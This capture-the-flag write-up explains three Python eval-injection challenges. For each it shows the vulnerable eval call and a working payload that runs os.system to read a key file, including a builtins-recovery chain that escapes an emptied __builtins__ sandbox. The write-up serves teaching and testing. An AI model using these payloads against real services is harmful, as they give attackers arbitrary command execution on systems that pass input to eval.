# Writeup
## Part 1
Part one's eval function looks like this:

```python
client_input = stdinput.readline()
eval(client_input)
```

This is unsafe, as `eval` can do anything in python when passed in an `exec` function.

As a result, we can pass the following injection in and get the ./key file:

```python
exec("import os\nos.system('cat ./key')")
```

## Part 2
Part two's eval function looks like this:

```python
client_input = stdinput.readline()
eval(client_input, {}, safe_functions)
```

This is also unsafe, as we can still access the globals despite only passing in the math function.
As a result, we can pass the following injection in and get the ./key file:
```python
# there are two easy to find variants of escaping the {} trick, here's one of them:
# eval(compile(\"\"\"import os \\nimport threading\\nthreading.Thread(target=os.system,args=[double_escape_quote_me]).start()\"\"\",'<string>', 'exec'))

# example:
eval(compile("""import os \nos.system("cat ./key")""",'<string>', 'exec'))
```
## Part 3
Part three's eval function looks like this:

```python
client_input = stdinput.readline()
eval(client_input, {'__builtins__':{}}, safe_functions)
```

Despite this [high-ranking search article](http://lybniz2.sourceforge.net/safeeval.html), this also is not safe
as a result, we can pass the following injection in to get the ./key file, inspired by [this blog post](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html):

```python
# since we're in Python 3, we can use the following cross-platform dropper
# [c for c in [''.__class__.__class__.__subclasses__(''.__class__.__class__)[0].register.__globals__['__loader__'].get_data.__globals__['sys'].modules['builtins']] if c.exec('t.__import__(\"os\").system(\"clear\")',{'t':c})]

# example:
[c for c in [''.__class__.__class__.__subclasses__(''.__class__.__class__)[0].register.__globals__['__loader__'].get_data.__globals__['sys'].modules['builtins']] if c.exec('t.__import__(\"os\").system(\"cat ./key\")',{'t':c})]
```